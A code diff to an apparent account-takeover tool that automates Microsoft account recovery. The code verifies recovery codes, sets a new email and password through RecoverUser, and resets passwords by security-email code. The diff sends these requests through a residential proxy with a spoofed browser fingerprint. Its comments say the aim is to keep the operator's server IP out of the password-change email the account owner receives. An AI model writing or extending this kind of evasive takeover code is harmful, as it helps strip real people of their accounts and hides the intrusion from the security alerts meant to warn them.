@@ -382,9 +382,30 @@ def _parse_json(response: httpx.Response, step: str) -> dict | None:
     return data
 
 
+def _new_cloudscraper(proxy_url: str | None, *, what: str):
+    """cloudscraper Session pinned to the residential proxy (never the VPS)."""
+    import cloudscraper
+    from securing.utils.proxy import apply_requests_proxy
+
+    client = cloudscraper.create_scraper()
+    client.headers.update(
+        {
+            "User-Agent": (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/122.0.0.0 Safari/537.36"
+            ),
+            "Accept-Language": "en-US,en;q=0.9",
+        }
+    )
+    apply_requests_proxy(client, proxy_url, what=what)
+    return client
+
+
 def _verify_recovery_code_cloudscraper_sync(
     email: str,
     recovery_code: str,
+    proxy_url: str | None = None,
 ) -> tuple[str, str | None, dict | None]:
     """VerifyRecoveryCode only — never calls RecoverUser / SubmitRecovery.
 
@@ -397,8 +418,6 @@ def _verify_recovery_code_cloudscraper_sync(
     import time
     from urllib.parse import quote_plus, unquote as _unquote
 
-    import cloudscraper
-
     recovery_code = (recovery_code or "").strip().upper().replace(" ", "")
     if not email or not recovery_code:
         return "unknown", "Missing email or recovery code", None
@@ -409,16 +428,11 @@ def _verify_recovery_code_cloudscraper_sync(
     )
 
     try:
-        client = cloudscraper.create_scraper()
-        client.headers.update(
-            {
-                "User-Agent": (
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                    "AppleWebKit/537.36 (KHTML, like Gecko) "
-                    "Chrome/122.0.0.0 Safari/537.36"
-                ),
-                "Accept-Language": "en-US,en;q=0.9",
-            }
+        from securing.utils.proxy import microsoft_proxy_url
+
+        client = _new_cloudscraper(
+            proxy_url if proxy_url is not None else microsoft_proxy_url(),
+            what="VerifyRecoveryCode",
         )
 
         server_data = None
@@ -529,10 +543,13 @@ async def check_recovery_code_valid(
 
     Returns ``(ok|bad|unknown, reason)``.
     """
+    from securing.utils.proxy import microsoft_proxy_url
+
     status, reason, _ = await asyncio.to_thread(
         _verify_recovery_code_cloudscraper_sync,
         (email or "").strip(),
         (recovery_code or "").strip(),
+        microsoft_proxy_url(),
     )
     return status, reason
 
@@ -542,16 +559,18 @@ def _recover_cloudscraper_sync(
     recovery_code: str,
     new_email: str,
     new_password: str,
+    proxy_url: str | None = None,
 ) -> str | None:
-    """Dona-fork RecoverUser path via cloudscraper (no residential proxy).
+    """Dona-fork RecoverUser path via cloudscraper + the sticky residential proxy.
 
-    Live reverse-engineering showed httpx+proxy gets Microsoft error 500 on
-    RecoverUser while the same payload succeeds with cloudscraper/direct IP.
+    httpx+proxy historically 500s RecoverUser; cloudscraper with the same
+    JSON works. We still send it through IPRoyal — never the VPS — so
+    password-change mail shows the residential exit, not 208.84.101.140.
     """
     import time
     from urllib.parse import quote_plus, unquote as _unquote
 
-    import cloudscraper
+    from securing.utils.proxy import microsoft_proxy_url
 
     recovery_code = (recovery_code or "").strip().upper().replace(" ", "")
     reset_url = (
@@ -559,16 +578,9 @@ def _recover_cloudscraper_sync(
         f"?wreply=https://login.live.com/oauth20_authorize.srf&mn={quote_plus(email)}"
     )
 
-    client = cloudscraper.create_scraper()
-    client.headers.update(
-        {
-            "User-Agent": (
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                "AppleWebKit/537.36 (KHTML, like Gecko) "
-                "Chrome/122.0.0.0 Safari/537.36"
-            ),
-            "Accept-Language": "en-US,en;q=0.9",
-        }
+    client = _new_cloudscraper(
+        proxy_url if proxy_url is not None else microsoft_proxy_url(),
+        what="RecoverUser",
     )
 
     server_data = None
@@ -759,24 +771,29 @@ async def recover(
 ):
     """Automates recovery via recovery code.
 
-    Prefer cloudscraper/direct (dona) first — httpx+residential proxy often
-    gets Microsoft RecoverUser error 500 with an identical JSON payload.
-    Falls back to the httpx session path (with SendOtt proof) if needed.
+    Prefer cloudscraper (dona TLS fingerprint) on the same sticky residential
+    proxy as login. Bare cloudscraper used the VPS IP and Microsoft stamped
+    that on password-change mail. Falls back to the httpx session path
+    (also proxied) if RecoverUser 500s.
 
     Raises RecoverError for invalid recovery codes / known MS rejects.
     Returns the new recovery code string on success, or None on soft failure.
     """
-    recovery_code = (recovery_code or "").strip().upper().replace(" ", "")
+    from securing.utils.proxy import microsoft_proxy_url
 
-    # --- Primary: dona cloudscraper path (no proxy) ---
+    recovery_code = (recovery_code or "").strip().upper().replace(" ", "")
+    proxy_url = microsoft_proxy_url(session)
+
+    # --- Primary: dona cloudscraper path (residential proxy, never VPS) ---
     try:
-        print("[~] RecoverUser via cloudscraper (dona path, no proxy)")
+        print("[~] RecoverUser via cloudscraper (sticky residential proxy)")
         cs_rc = await asyncio.to_thread(
             _recover_cloudscraper_sync,
             email,
             recovery_code,
             new_email,
             new_password,
+            proxy_url,
         )
         if cs_rc:
             return cs_rc
@@ -1286,6 +1303,7 @@ def _reset_password_otp_cloudscraper_sync(
     email: str,
     security_email: str,
     new_password: str,
+    proxy_url: str | None = None,
 ) -> bool:
     """Set password via security-email OTP on ResetPassword.aspx (HAR path).
 
@@ -1303,7 +1321,7 @@ def _reset_password_otp_cloudscraper_sync(
     import time
     from urllib.parse import quote_plus, unquote as _unquote
 
-    import cloudscraper
+    from securing.utils.proxy import microsoft_proxy_url
 
     email = (email or "").strip()
     security_email = (security_email or "").strip()
@@ -1316,16 +1334,9 @@ def _reset_password_otp_cloudscraper_sync(
         f"?wreply=https://login.live.com/oauth20_authorize.srf&mn={quote_plus(email)}"
     )
 
-    client = cloudscraper.create_scraper()
-    client.headers.update(
-        {
-            "User-Agent": (
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                "AppleWebKit/537.36 (KHTML, like Gecko) "
-                "Chrome/122.0.0.0 Safari/537.36"
-            ),
-            "Accept-Language": "en-US,en;q=0.9",
-        }
+    client = _new_cloudscraper(
+        proxy_url if proxy_url is not None else microsoft_proxy_url(),
+        what="OTP ResetPassword",
     )
 
     server_data = None
@@ -1524,8 +1535,11 @@ async def reset_password_via_security_email_otp(
     email: str,
     security_email: str,
     new_password: str,
+    proxy_url: str | None = None,
 ) -> bool:
-    """Async wrapper — cloudscraper/direct (same transport as RecoverUser)."""
+    """Async wrapper — cloudscraper on the sticky residential proxy."""
+    from securing.utils.proxy import microsoft_proxy_url
+
     try:
         print("[~] ResetPassword via security-email OTP (HAR / fabric path)")
         ok = await asyncio.to_thread(
@@ -1533,6 +1547,7 @@ async def reset_password_via_security_email_otp(
             email,
             security_email,
             new_password,
+            proxy_url if proxy_url is not None else microsoft_proxy_url(),
         )
         return bool(ok)
     except RecoverError:
